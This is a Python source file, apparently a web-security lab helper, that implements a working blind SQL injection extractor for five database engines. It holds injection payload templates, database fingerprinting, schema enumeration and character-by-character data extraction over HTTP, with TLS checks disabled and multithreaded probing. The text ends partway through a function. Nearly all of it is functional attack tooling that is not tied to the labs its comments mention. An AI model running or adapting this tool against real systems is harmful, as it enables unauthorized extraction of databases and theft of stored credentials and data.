"""
Blind SQL Injection extractor — boolean-based and time-based.

Multi-database: MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite, with
auto-detection. Parses a raw HTTP request, injects a raw (un-encoded) payload
into a chosen parameter (query string, cookie crumb, or POST body), and extracts
data character-by-character using length-first + per-character search.

Designed to integrate with blindsql_routes.py: the route passes its task object
in as `logger` so progress shows in the UI, and a threading.Event as `stop_event`
so the UI stop button actually halts extraction.
"""
import re
import time
import string
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter

try:
    from urllib3.util.retry import Retry
    from urllib3 import disable_warnings
    from urllib3.exceptions import InsecureRequestWarning
    disable_warnings(InsecureRequestWarning)
except Exception:  # pragma: no cover
    from requests.packages.urllib3.util.retry import Retry  # type: ignore


# ── Fallback logger for standalone / CLI use ─────────────────────────────────
class _PrintLogger:
    task_id = "local"

    def log(self, msg):
        print(f"[blindsql] {msg}")

    def update_results(self, key, value):
        pass


# ── Per-database SQL dialects ────────────────────────────────────────────────
# Each template uses {q} (the inner scalar subquery), {pos} (1-based char index),
# {n} (an integer), {tbl}, {col}, and {delay} (seconds). substr is 1-indexed in
# every dialect below. Comparisons are made case-sensitive where the dialect
# needs an explicit cast.
DIALECTS = {
    "mysql": {
        "substr":   "SUBSTRING(({q}),{pos},1)",
        "ascii":    "ASCII(SUBSTRING(({q}),{pos},1))",
        "length":   "LENGTH(({q}))",
        "limit":    "LIMIT {n},1",
        "tables":   "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "columns":  "SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}'",
        "fingerprint": "SELECT @@version_comment",          # MySQL-only function
        "error_case": "' AND (SELECT CASE WHEN ({cond}) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END {from})-- -",
        "time_true":  "OR IF(({cond}),SLEEP({delay}),0)",
    },
    "postgresql": {
        "substr":   "SUBSTRING(({q}) FROM {pos} FOR 1)",
        "ascii":    "ASCII(SUBSTRING(({q}) FROM {pos} FOR 1))",
        "length":   "LENGTH(({q}))",
        "limit":    "LIMIT 1 OFFSET {n}",
        "tables":   "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
        "columns":  "SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}'",
        "fingerprint": "SELECT version()",
        "error_case": "'||(SELECT CASE WHEN ({cond}) THEN CAST(1/0 AS int) ELSE '' END {from})||'",
        # postgres uses a different boolean-to-delay trick; CASE + pg_sleep
        "time_true":  "AND (SELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)",
    },
    "mssql": {
        "substr":   "SUBSTRING(({q}),{pos},1)",
        "ascii":    "ASCII(SUBSTRING(({q}),{pos},1))",
        "length":   "LEN(({q}))",
        "limit":    "OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY",
        "tables":   "SELECT name FROM sys.tables",
        "columns":  "SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{tbl}')",
        "fingerprint": "SELECT @@version",
        "error_case": "'+(SELECT CASE WHEN ({cond}) THEN 1/0 ELSE '' END {from})+'",
        "time_true":  "; IF ({cond}) WAITFOR DELAY '0:0:{delay}'--",
    },
    "oracle": {
        "substr":   "SUBSTR(({q}),{pos},1)",
        "ascii":    "ASCII(SUBSTR(({q}),{pos},1))",
        "length":   "LENGTH(({q}))",
        # Oracle has no LIMIT/OFFSET pre-12c; ROWNUM-based pagination:
        "limit":    "",  # handled specially in _paged()
        "tables":   "SELECT table_name FROM all_tables",
        "columns":  "SELECT column_name FROM all_tab_columns WHERE table_name='{tbl}'",
        "fingerprint": "SELECT banner FROM v$version WHERE ROWNUM=1",
        "time_true":  "AND {pad}",  # time-based on Oracle is awkward; boolean preferred
        # Error wrapper for FLAT enumeration: {cond} is the bare condition, {from}
        # is the candidate's FROM/WHERE. Produces the lab's working shape.
        "error_case": "'||(SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE '' END {from})||'",
    },
    "sqlite": {
        "substr":   "SUBSTR(({q}),{pos},1)",
        "ascii":    "UNICODE(SUBSTR(({q}),{pos},1))",
        "length":   "LENGTH(({q}))",
        "limit":    "LIMIT 1 OFFSET {n}",
        "tables":   "SELECT name FROM sqlite_master WHERE type='table'",
        "columns":  "SELECT name FROM pragma_table_info('{tbl}')",
        "fingerprint": "SELECT sqlite_version()",
        "error_case": None,  # sqlite has no error trigger; use boolean responses
        "time_true":  None,  # SQLite has no sleep; time-based unsupported
    },
}

DETECT_ORDER = ["postgresql", "mysql", "mssql", "oracle", "sqlite"]

# ── Flat enumeration candidates ──────────────────────────────────────────────
# For each DB, an ORDERED list of candidate ways to enumerate table/column names
# using the FLAT technique (the column referenced bare, the FROM/WHERE in context
# — no nested scalar subquery). Each candidate is tried in turn and validated
# (LENGTH(col)>0 must be TRUE and LENGTH(col)>9999 must be FALSE) before use, so a
# shape that's wrong for the target self-filters. Users can override these.
#
# Placeholders: {col} = the name column; {row} = 0-based row index; {tbl} = table.
# "from" is the FROM/WHERE the template wraps; "col" is the bare expression.
ENUM_CANDIDATES = {
    "oracle": {
        "tables": [
            {"col": "table_name", "from": "FROM (SELECT table_name, ROWNUM rn FROM user_tables) WHERE rn={rownum}"},
            {"col": "table_name", "from": "FROM (SELECT table_name, ROWNUM rn FROM all_tables) WHERE rn={rownum}"},
            {"col": "table_name", "from": "FROM user_tables WHERE ROWNUM=1"},  # first row only
        ],
        "columns": [
            {"col": "column_name", "from": "FROM (SELECT column_name, ROWNUM rn FROM all_tab_columns WHERE table_name='{tbl}') WHERE rn={rownum}"},
            {"col": "column_name", "from": "FROM (SELECT column_name, ROWNUM rn FROM user_tab_columns WHERE table_name='{tbl}') WHERE rn={rownum}"},
        ],
    },
    "postgresql": {
        "tables": [
            {"col": "table_name", "from": "FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {row}"},
            {"col": "table_name", "from": "FROM information_schema.tables LIMIT 1 OFFSET {row}"},
        ],
        "columns": [
            {"col": "column_name", "from": "FROM information_schema.columns WHERE table_name='{tbl}' LIMIT 1 OFFSET {row}"},
        ],
    },
    "mysql": {
        "tables": [
            {"col": "table_name", "from": "FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {row}"},
            {"col": "table_name", "from": "FROM information_schema.tables LIMIT 1 OFFSET {row}"},
        ],
        "columns": [
            {"col": "column_name", "from": "FROM information_schema.columns WHERE table_name='{tbl}' LIMIT 1 OFFSET {row}"},
        ],
    },
    "mssql": {
        "tables": [
            {"col": "name", "from": "FROM sys.tables ORDER BY name OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY"},
        ],
        "columns": [
            {"col": "name", "from": "FROM sys.columns WHERE object_id=OBJECT_ID('{tbl}') ORDER BY name OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY"},
        ],
    },
    "sqlite": {
        "tables": [
            {"col": "name", "from": "FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {row}"},
        ],
        "columns": [
            {"col": "name", "from": "FROM pragma_table_info('{tbl}') LIMIT 1 OFFSET {row}"},
        ],
    },
}


class StopRequested(Exception):
    """Raised internally when the caller signals stop via stop_event."""


class BlindSQLInjector:
    # Full printable charset, ordered by rough frequency for faster hits.
    CHARSET = (
        string.ascii_lowercase + string.ascii_uppercase + string.digits +
        "_-@. !#$%&*+/:;=?[]{}~"
    )

    def __init__(self, raw_request, injection_point, injection_type,
                 true_indicator, database_type="auto",
                 logger=None, stop_event=None,
                 case_sensitive=False, encoding="none",
                 custom_template=None, invert_indicator=False,
                 where_clause=None,
                 enum_tables_override=None, enum_columns_override=None,
                 threads=1, time_delay=5):
        self.raw_request = raw_request
        self.injection_point = injection_point
        self.injection_type = (injection_type or "boolean").lower()
        self.true_indicator = true_indicator or ""
        self.database_type = (database_type or "auto").lower()
        self.task = logger or _PrintLogger()
        self.stop_event = stop_event
        self.session = self._create_session()
        # Time-based delay is user-set to match the template's SLEEP (pg_sleep(5),
        # SLEEP(10), WAITFOR DELAY '0:0:10', etc.). The detection threshold derives
        # from it: ~60% of the delay — high enough that network latency can't false
        # -trigger, low enough that a real sleep clearly crosses it.
        try:
            self.delay = max(1, int(time_delay))
        except (TypeError, ValueError):
            self.delay = 5
        self.time_threshold = max(1.5, self.delay * 0.6)
        self.results = []
        # resolved after detection
        self._dialect_name = None if self.database_type == "auto" else self.database_type

        # True-indicator matching: case-insensitive by default.
        self.case_sensitive = bool(case_sensitive)

        # Invert: when True, the indicator PRESENT means the condition is FALSE
        # (e.g. a "No results"/error string that shows on FALSE and vanishes on
        # TRUE). Common in the real world where only a false-side signal exists.
        self.invert_indicator = bool(invert_indicator)

        # Payload encoding applied just before the payload enters the request.
        self.encoding = (encoding or "none").lower()

        # Optional WHERE clause for DIRECT extraction. When set, table/column/data
        # extraction builds FLAT expressions (e.g. ASCII(SUBSTR(password,1,1))>97)
        # against this row instead of nesting a SELECT subquery. The custom_template
        # supplies the FROM/WHERE context. This matches the hand-written technique
        # used on Oracle conditional-error labs and avoids broken nested subqueries.
        self.where_clause = where_clause.strip() if where_clause else None

        # User-supplied enumeration candidate overrides. Each is a list of dicts
        # {"col": ..., "from": ...} or None to use the built-in defaults. Accepts a
        # parsed list directly (the route parses the UI text into this shape).
        self.enum_tables_override = enum_tables_override or None
        self.enum_columns_override = enum_columns_override or None

        # Parallelism. 1 = fully sequential (default, safe). For boolean/error we
        # parallelize character POSITIONS (each position's binary search runs in
        # its own thread). For time-based we test candidate characters per position
        # across threads and take the slow responder, with an ambiguity re-check.
        try:
            self.threads = max(1, int(threads))
        except (TypeError, ValueError):
            self.threads = 1

        # Custom payload template: a string containing "{1}" where the tool drops
        # the generated boolean condition. Empty/None → use built-in wrapping.
        # e.g. "' OR 1={1}-- -" → the {1} is replaced by "(SELECT ...)>64" etc.
        self.custom_template = custom_template.strip() if custom_template else None
        if self.custom_template and "{1}" not in self.custom_template:
            # Tolerate {condition} as an alias for {1}.
            if "{condition}" in self.custom_template:
                self.custom_template = self.custom_template.replace("{condition}", "{1}")
            else:
                self.log("[!] custom template has no {1} placeholder — ignoring it")
                self.custom_template = None

        # Marker mode: if the raw request contains a §...§ marker, the payload is
        # injected exactly there and the rest of the request is sent byte-for-byte.
        # The text between the markers is preserved and the payload appended to it,
        # matching Burp Intruder's behaviour. This is the preferred, unambiguous
        # mode — no parameter guessing, no header reconstruction.
        self.MARKER = "§"
        self._marker_base = ""   # original text inside the markers
        self._has_marker = self.raw_request.count(self.MARKER) >= 2
        if self._has_marker:
            first = self.raw_request.index(self.MARKER)
            second = self.raw_request.index(self.MARKER, first + 1)
            self._marker_base = self.raw_request[first + 1:second]

    # ── infra ────────────────────────────────────────────────────────────────
    def _create_session(self):
        s = requests.Session()
        # Fully transparent session for detection: never retry on ANY status code,
        # never raise on status, never let the HTTP layer mask or alter a response.
        # Every response (200, 301, 403, 500, anything) reaches the matcher intact,
        # so the True Indicator alone decides true/false. We keep ZERO status-based
        # retries; only allow a single connection-level retry for transient network
        # blips, which never changes what the server returned.
        retry = Retry(
            total=1,                 # at most one retry, connection-level only
            connect=1,
            read=0,                  # don't retry on read (matters for time-based)
            redirect=0,              # never auto-follow redirects via retry
            status=0,                # never retry based on status code
            status_forcelist=[],     # no status triggers a retry
            raise_on_status=False,   # a status code never raises
            raise_on_redirect=False,
            respect_retry_after_header=False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        return s

    # Each worker thread gets its own session (requests.Session isn't reliably
    # safe for concurrent use). Same transparent config as the main session.
    def _new_session(self):
        return self._create_session()

    def _check_stop(self):
        if self.stop_event is not None and self.stop_event.is_set():
            raise StopRequested()

    def log(self, msg):
        try:
            self.task.log(msg)
        except Exception:
            print(msg)

    # ── request parsing ────────────────────────────────────────────────────────
    def _parse_raw_request(self):
        # Normalise CRLF and split.
        text = self.raw_request.replace("\r\n", "\n").strip("\n")
        lines = text.split("\n")
        request_line = lines[0].split()
        method = request_line[0]
        path = request_line[1] if len(request_line) > 1 else "/"

        headers = {}
        body = ""
        body_start = -1
        for i in range(1, len(lines)):
            if lines[i].strip() == "":
                body_start = i + 1
                break
            if ":" in lines[i]:
                key, value = lines[i].split(":", 1)
                headers[key.strip()] = value.strip()
        if body_start >= 0:
            body = "\n".join(lines[body_start:])

        host = headers.get("Host", "localhost")
        # Default to HTTPS unless it's plainly a local/:80 host.
        if host.startswith("http"):
            base = host
        elif host.startswith("localhost") or host.startswith("127.") or ":80" in host:
            base = "http://" + host
        else:
            base = "https://" + host

        url = base + path
        return method, url, headers, body

    def _find_cookie_key(self, headers):
        for k in headers:
            if k.lower() == "cookie":
                return k
        return None

    def _inject_payload(self, payload):
        """Insert `payload` raw (un-encoded) after the injection point's value."""
        method, url, headers, body = self._parse_raw_request()
        parsed = urlparse(url)
        injected = False

        # 1) Query string — replace value of injection_point, keep payload raw.
        if parsed.query and re.search(rf"(^|&){re.escape(self.injection_point)}=",
                                      parsed.query):
            def _q(m):
                return f"{m.group(1)}{self.injection_point}={m.group(2)}{payload}"
            new_query = re.sub(
                rf"(^|&){re.escape(self.injection_point)}=([^&]*)",
                _q, parsed.query)
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            injected = True

        # 2) Cookie crumb — match name=value with or without quotes.
        ckey = self._find_cookie_key(headers)
        if not injected and ckey and re.search(
                rf"(^|;\s*){re.escape(self.injection_point)}=",
                headers[ckey]):
            def _c(m):
                return f"{m.group(1)}{self.injection_point}={m.group(2)}{payload}"
            headers[ckey] = re.sub(
                rf"(^|;\s*){re.escape(self.injection_point)}=([^;]*)",
                _c, headers[ckey])
            injected = True

        # 3) POST body — name=value (urlencoded form style).
        if not injected and body and re.search(
                rf"(^|&){re.escape(self.injection_point)}=", body):
            def _b(m):
                return f"{m.group(1)}{self.injection_point}={m.group(2)}{payload}"
            body = re.sub(
                rf"(^|&){re.escape(self.injection_point)}=([^&]*)",
                _b, body)
            injected = True

        return method, url, headers, body, injected

    # ── single request ──────────────────────────────────────────────────────────
    def _build_from_raw(self, raw_text):
        """Parse an exact raw request string into (method, url, headers, body),
        changing nothing except deriving the URL. Used in marker mode so the
        request goes out byte-for-byte as the user typed it."""
        text = raw_text.replace("\r\n", "\n").strip("\n")
        lines = text.split("\n")
        parts = lines[0].split()
        method = parts[0]
        path = parts[1] if len(parts) > 1 else "/"

        headers = {}
        body = ""
        body_start = -1
        for i in range(1, len(lines)):
            if lines[i].strip() == "":
                body_start = i + 1
                break
            if ":" in lines[i]:
                k, v = lines[i].split(":", 1)
                headers[k.strip()] = v.strip()
        if body_start >= 0:
            body = "\n".join(lines[body_start:])

        host = headers.get("Host", headers.get("host", "localhost"))
        if host.startswith("http"):
            base = host
        elif host.startswith("localhost") or host.startswith("127.") or ":80" in host:
            base = "http://" + host
        else:
            base = "https://" + host
        return method, base + path, headers, body

    def _encode_payload(self, payload):
        """Apply the selected encoding to the payload before it enters the request."""
        enc = self.encoding
        if enc in ("none", "", None):
            return payload
        if enc == "url":
            from urllib.parse import quote
            return quote(payload, safe="")
        if enc in ("double-url", "double_url", "doubleurl"):
            from urllib.parse import quote
            return quote(quote(payload, safe=""), safe="")
        if enc == "url-plus":  # spaces as +
            from urllib.parse import quote_plus
            return quote_plus(payload)
        if enc == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        if enc == "hex":
            return payload.encode().hex()
        if enc == "unicode":  # \uXXXX escape every char
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        if enc == "html":  # &#NN; entities
            return "".join(f"&#{ord(c)};" for c in payload)
        # unknown → leave unchanged
        self.log(f"[!] unknown encoding '{enc}', sending raw")
        return payload

    def _send(self, payload, session=None):
        self._check_stop()
        payload = self._encode_payload(payload)

        if self._has_marker:
            # REPLACE the FIRST §...§ span with the payload (Burp Intruder model):
            # the marked text is removed and the payload takes its place exactly.
            # If the injection needs the original value, include it in the template.
            pattern = re.escape(self.MARKER) + r"(.*?)" + re.escape(self.MARKER)
            raw_filled = re.sub(
                pattern,
                lambda m: payload,
                self.raw_request,
                count=1,
                flags=re.DOTALL,
            )
            method, url, headers, body = self._build_from_raw(raw_filled)
        else:
            method, url, headers, body, injected = self._inject_payload(payload)
            if not injected:
                self.log(f"[!] injection point '{self.injection_point}' not found in "
                         f"query/cookie/body — payload not applied")

        skip = {"host", "content-length", "transfer-encoding", "connection"}
        clean = {k: v for k, v in headers.items() if k.lower() not in skip}

        # Timeout must exceed the SLEEP delay for time-based detection, or a TRUE
        # (delayed) response would be cut off and misread as a failure. For boolean
        # /error modes a normal timeout is fine.
        if self.injection_type == "time":
            req_timeout = self.delay + 20      # delay + generous margin
        else:
            req_timeout = 20

        sess = session or self.session
        start = time.time()
        # Use the request's actual method (GET, POST, PUT, PATCH, DELETE, HEAD…)
        # so detection isn't limited to GET/POST endpoints.
        resp = sess.request(
            method.upper(), url,
            headers=clean,
            data=(body.encode() if body else None),
            timeout=req_timeout,
            verify=False,
            allow_redirects=False,
        )
        return resp, (time.time() - start)

    def _is_true(self, payload, session=None):
        """Boolean/error: true_indicator present in status+headers+body.
        Time: response delayed beyond threshold.

        The indicator is matched against the FULL response — status line, headers,
        and body — so "HTTP 500", "200", a header value, or body text all work.
        Nothing in the HTTP layer is allowed to mask the response.
        """
        try:
            if self.injection_type == "time":
                try:
                    _, elapsed = self._send(payload, session=session)
                    return elapsed >= self.time_threshold
                except requests.exceptions.ReadTimeout:
                    # A read timeout in time-based mode usually means the SLEEP
                    # fired and held the connection past our timeout — i.e. TRUE.
                    self.log("[*] read timeout during time-based probe — treating as TRUE (SLEEP fired)")
                    return True
            resp, _ = self._send(payload, session=session)

            # Build a searchable blob: "HTTP <status> <reason>" + headers + body.
            reason = getattr(resp, "reason", "") or ""
            status_line = f"HTTP {resp.status_code} {reason}"
            header_blob = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
            haystack = f"{status_line}\n{header_blob}\n\n{resp.text}"

            needle = self.true_indicator
            if self.case_sensitive:
                present = needle in haystack
            else:
                present = needle.lower() in haystack.lower()
            # Invert mode: indicator present == condition FALSE.
            return (not present) if self.invert_indicator else present
        except StopRequested:
            raise
        except Exception as e:
            # Genuine network/transport error — not a SQL signal. Report loudly so
            # it isn't silently misread as a FALSE result.
            self.log(f"[!] request error (treated as no-signal/FALSE): {e}")
            return False

    # public alias kept for backward compatibility with the route layer
    def _test_payload(self, payload):
        return self._is_true(payload)

    # ── dialect helpers ──────────────────────────────────────────────────────────
    def _dialect(self):
        return DIALECTS[self._dialect_name]

    def _cond_payload(self, condition):
        """Wrap a boolean SQL condition into the injection string for this mode."""
        # Custom template overrides built-in wrapping. {1} = the condition slot.
        if self.custom_template:
            return self.custom_template.replace("{1}", f"({condition})")
        if self.injection_type == "time":
            tmpl = self._dialect().get("time_true")
            if not tmpl:
                raise RuntimeError(
                    f"time-based not supported for {self._dialect_name}; use boolean")
            inner = tmpl.format(cond=condition, delay=self.delay, pad="1=1")
            return f"' {inner}-- -"
        # boolean: close the quote, AND the condition, comment out the rest.
        return f"' AND ({condition})-- -"

    def detect_database(self):
        """Probe each dialect to identify the DBMS using a TRUE/FALSE differential.
        A dialect is only accepted if a syntactically-valid TRUE condition reads
        as true AND the matching FALSE condition reads as false — that rules out
        dialects whose syntax errors out to a constant baseline response."""
        if self._dialect_name:
            return self._dialect_name

        # If a custom template is set, the user has defined the injection context
        # (e.g. Oracle ||...|| error-based). Probe THROUGH that template so the
        # fingerprint test actually fits — otherwise the built-in ' AND ...-- -
        # probes never match and we always fall back to the default.
        if self.custom_template:
            self.log("[*] auto-detecting database (via custom template)...")
            for name in DETECT_ORDER:
                self._check_stop()
                d = DIALECTS[name]
                # Both probes must use THIS DBMS's syntax, differing only in the
                # boolean. The fingerprint expression is dialect-specific, so:
                #   • Right DB:  TRUE parses+fires (error/500), FALSE parses+quiet
                #                (200) -> t=True, f=False -> accepted.
                #   • Wrong DB:  the syntax is invalid, so BOTH probes error out
                #                (both 500) -> t=True, f=True -> rejected by not f.
                # A generic "1=2" false probe (the old bug) parses on every DB and
                # could never reject a wrong dialect on an error-based target.
                fp = d['substr'].format(q=d['fingerprint'], pos=1)
                true_probe  = f"({fp}) IS NOT NULL AND 1=1"
                false_probe = f"({fp}) IS NOT NULL AND 1=2"
                try:
                    t = self._is_true(self._cond_payload(true_probe))
                    f = self._is_true(self._cond_payload(false_probe))
                    if t and not f:
                        self._dialect_name = name
                        self.log(f"[+] database identified: {name}")
                        return name
                except StopRequested:
                    raise
                except Exception:
                    continue
            self._dialect_name = None
            self.log("[!] could not fingerprint via template.")
            self.log("[!] set Database Type manually (Auto-detect is unreliable on")
            self.log("[!] error-based targets — a broken query looks the same as TRUE).")
            raise RuntimeError("database not identified; set Database Type manually")

        self.log("[*] auto-detecting database...")
        for name in DETECT_ORDER:
            self._check_stop()
            d = DIALECTS[name]
            # Build a true and a false condition using this dialect's substring fn,
            # which is only valid syntax on this DBMS.
            char1 = d["substr"].format(q=d["fingerprint"], pos=1)
            true_cond  = f"' AND ({char1})=({char1})-- -"
            false_cond = f"' AND ({char1})=CHR(0)-- -" if name in ("postgresql", "oracle") \
                         else f"' AND ({char1})=CHAR(0)-- -" if name == "mssql" \
                         else f"' AND ({char1})=0x00-- -" if name == "mysql" \
                         else f"' AND ({char1})=CHAR(0)-- -"
            try:
                if self._is_true(true_cond) and not self._is_true(false_cond):
                    self._dialect_name = name
                    self.log(f"[+] database identified: {name}")
                    return name
            except StopRequested:
                raise
            except Exception:
                continue
        # Couldn't fingerprint — warn loudly. WSA labs are usually PostgreSQL.
        self._dialect_name = "postgresql"
        self.log("[!] could not fingerprint DB via differential probes.")
        self.log("[!] defaulting to PostgreSQL (common for PortSwigger labs).")
        self.log("[!] if extraction returns nothing, set Database Type manually.")
        return self._dialect_name

    def _paged_subquery(self, select_sql, n):
        """Return a scalar subquery for the nth (0-based) row of select_sql."""
        d = self._dialect()
        if self._dialect_name == "oracle":
            # Oracle 12c+ supports OFFSET/FETCH, which keeps the original single
            # selected column intact (the old ROWNUM trick selected a nonexistent
            # "col" alias and errored on every probe).
            return f"{select_sql} OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY"
        return f"{select_sql} {d['limit'].format(n=n)}"

    # ── extraction ──────────────────────────────────────────────────────────────
    def _string_length(self, scalar_sql, cap=64):
        """Binary-search the length of a scalar value to bound extraction."""
        d = self._dialect()
        length_expr = d["length"].format(q=scalar_sql)
        lo, hi = 0, cap
        while lo < hi:
            self._check_stop()
            mid = (lo + hi + 1) // 2
            if self._is_true(self._cond_payload(f"{length_expr}>={mid}")):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def extract_string(self, scalar_sql, max_length=64):
        """Extract a scalar string value using length-first + binary char search."""
        d = self._dialect()
        n = self._string_length(scalar_sql, cap=max_length)
        if n == 0:
            return ""
        result = []
        ascii_expr_tmpl = d["ascii"]
        for pos in range(1, n + 1):
            self._check_stop()
            ascii_expr = ascii_expr_tmpl.format(q=scalar_sql, pos=pos)
            lo, hi = 32, 126  # printable ASCII range
            while lo < hi:
                self._check_stop()
                mid = (lo + hi) // 2
                if self._is_true(self._cond_payload(f"{ascii_expr}>{mid}")):
                    lo = mid + 1
                else:
                    hi = mid
            ch = chr(lo)
            result.append(ch)
            current = "".join(result)
            self.log(f"    [{pos}/{n}] {current}")
            self.results.append({"pos": pos, "char": ch, "result": current})
        return "".join(result)

    # ── flat candidate enumeration ──────────────────────────────────────────────
    def _enum_cond_payload(self, condition, from_clause):
        """Build a full injection payload for FLAT enumeration.

        Priority:
        1. If a custom template is set, USE IT — the condition is made
           self-contained by folding the candidate's FROM into a scalar subquery,
           so the user's template (boolean / error / TIME-BASED pg_sleep / etc.)
           drives detection. This is what makes time-based enumeration work.
        2. Else if the dialect has an error_case wrapper, use that with the
           candidate's flat {from}.
        3. Else fall back to a plain scalar-subquery boolean condition.
        """
        d = self._dialect()

        # (1) Custom template wins. Fold FROM into the condition as a scalar
        # subquery so the template stays generic. e.g. condition "LENGTH(col)>0"
        # with from "FROM user_tables WHERE ROWNUM=1" becomes
        # "(SELECT LENGTH(col) FROM user_tables WHERE ROWNUM=1)>0".
        if self.custom_template:
            self_contained = self._fold_from_into_condition(condition, from_clause)
            return self._cond_payload(self_contained)

        ec = d.get("error_case")
        if ec:
            return ec.replace("{cond}", condition).replace("{from}", from_clause)
        return self._cond_payload(self._fold_from_into_condition(condition, from_clause))

    @staticmethod
    def _fold_from_into_condition(condition, from_clause):
        """Turn 'EXPR<op>VALUE' + 'FROM ... WHERE ...' into
        '(SELECT EXPR FROM ... WHERE ...)<op>VALUE' so the comparison is a
        self-contained scalar that any generic template can wrap.
        Splits on the comparison operator (>=, <=, >, <, =)."""
        import re as _re
        m = _re.match(r"^(.*?)(>=|<=|<>|!=|>|<|=)(.*)$", condition.strip())
        if not m:
            # no operator found — wrap whole thing
            frm = from_clause if from_clause.lstrip().upper().startswith("FROM") else f"FROM {from_clause}"
            return f"(SELECT {condition} {frm})"
        left, op, right = m.group(1).strip(), m.group(2), m.group(3).strip()
        frm = from_clause if from_clause.lstrip().upper().startswith("FROM") else f"FROM {from_clause}"
        return f"(SELECT {left} {frm}){op}{right}"

    # ── unified character extraction (sequential + parallel) ────────────────────
    def _is_true_isolated(self, payload):
        """Like _is_true but uses a fresh Session — safe to call from worker threads
        (requests.Session is not reliably thread-safe for concurrent requests)."""
        sess = self._new_session()
        try:
            return self._is_true(payload, session=sess)
        finally:
            try:
                sess.close()
            except Exception:
                pass

    def _find_length(self, payload_for, max_length):
        """Binary-search the length using payload_for('len', op, n)."""
        lo, hi = 0, max_length
        while lo < hi:
            self._check_stop()
            mid = (lo + hi + 1) // 2
            if self._is_true(payload_for('len', '>=', mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _extract_chars(self, payload_for, n):
        """Extract n characters. payload_for('char', pos, ('>',val)) builds the probe.
        Dispatches by mode/threads:
          • threads==1: sequential binary search (original behaviour)
          • boolean/error + threads>1: each POSITION binary-searched in its own thread
          • time + threads>1: per position, candidate chars tested across threads;
            the slow responder wins; ambiguous positions re-checked single-threaded.
        """
        if self.threads <= 1:
            return self._extract_chars_seq(payload_for, n)
        if self.injection_type == "time":
            return self._extract_chars_time_parallel(payload_for, n)
        return self._extract_chars_bool_parallel(payload_for, n)

    def _char_binary_search(self, payload_for, pos, is_true_fn):
        """Binary-search one character position's ASCII value. is_true_fn lets the
        caller inject an isolated-session tester for thread workers."""
        a, b = 32, 126
        while a < b:
            self._check_stop()
            mid = (a + b) // 2
            if is_true_fn(payload_for('char', pos, ('>', mid))):
                a = mid + 1
            else:
                b = mid
        return chr(a)

    def _extract_chars_seq(self, payload_for, n):
        out = []
        for pos in range(1, n + 1):
            self._check_stop()
            ch = self._char_binary_search(payload_for, pos, self._is_true)
            out.append(ch)
            cur = "".join(out)
            self.log(f"    [{pos}/{n}] {cur}")
            self.results.append({"pos": pos, "char": ch, "result": cur})
        return "".join(out)

    def _extract_chars_bool_parallel(self, payload_for, n):
        from concurrent.futures import ThreadPoolExecutor
        results = [None] * n
        self.log(f"    extracting {n} chars across {self.threads} threads (boolean)...")

        def work(pos):
            return pos, self._char_binary_search(payload_for, pos, self._is_true_isolated)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(work, p) for p in range(1, n + 1)]
            for fut in futures:
                self._check_stop()
                pos, ch = fut.result()
                results[pos - 1] = ch
        val = "".join(c or "?" for c in results)
        self.log(f"    [done] {val}")
        for i, c in enumerate(results, 1):
            self.results.append({"pos": i, "char": c, "result": val})
        return val

    def _extract_chars_time_parallel(self, payload_for, n):
        """Time-based: per position, test every printable char with ONE request each,
        spread across threads. The char whose request is 'slow' (sleep fired) is the
        hit. If a position yields zero or multiple slow hits (ambiguous under load),
        re-test that position single-threaded with a binary search."""
        from concurrent.futures import ThreadPoolExecutor
        charset = [chr(c) for c in range(32, 127)]
        out = [None] * n
        self.log(f"    time-based: {self.threads} threads, full ASCII per position...")

        for pos in range(1, n + 1):
            self._check_stop()
            hits = []

            def probe(ch):
                # equality test: SUBSTR(...,pos,1) = 'ch'  -> sleep if true
                payload = payload_for('char_eq', pos, ('=', ch))
                return ch, self._is_true_isolated(payload)

            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                for ch, slow in ex.map(probe, charset):
                    if slow:
                        hits.append(ch)

            if len(hits) == 1:
                out[pos - 1] = hits[0]
            else:
                # ambiguous (0 or >1 slow) — load skew. Re-check this position
                # sequentially with a binary search for reliability.
                self.log(f"    [{pos}] ambiguous ({len(hits)} hits) — re-checking single-thread")
                out[pos - 1] = self._char_binary_search(payload_for, pos, self._is_true)
            cur = "".join(c or "?" for c in out[:pos])
            self.log(f"    [{pos}/{n}] {cur}")
            self.results.append({"pos": pos, "char": out[pos - 1], "result": cur})
        return "".join(c or "?" for c in out)

    def _validate_candidate(self, col, from_clause):
        """Your idea: a candidate query shape is trusted only if LENGTH(col)>0 reads
        TRUE and LENGTH(col)>9999 reads FALSE. A broken shape errors (or stays quiet)
        on both, so it can't pass — it self-filters."""
        d = self._dialect()
        length_expr = d["length"].format(q=col)
        try:
            hi = self._is_true(self._enum_cond_payload(f"{length_expr}>0", from_clause))
            lo = self._is_true(self._enum_cond_payload(f"{length_expr}>9999", from_clause))
            return hi and not lo
        except StopRequested:
            raise
        except Exception:
            return False

    def _extract_flat_enum(self, col, from_clause, max_length=128):
        """Length-first + per-char extraction for a value referenced by the bare
        expression `col`, with `from_clause` supplying the FROM/WHERE context.
        Uses the unified engine (sequential or threaded per settings)."""
        d = self._dialect()
        length_expr = d["length"].format(q=col)

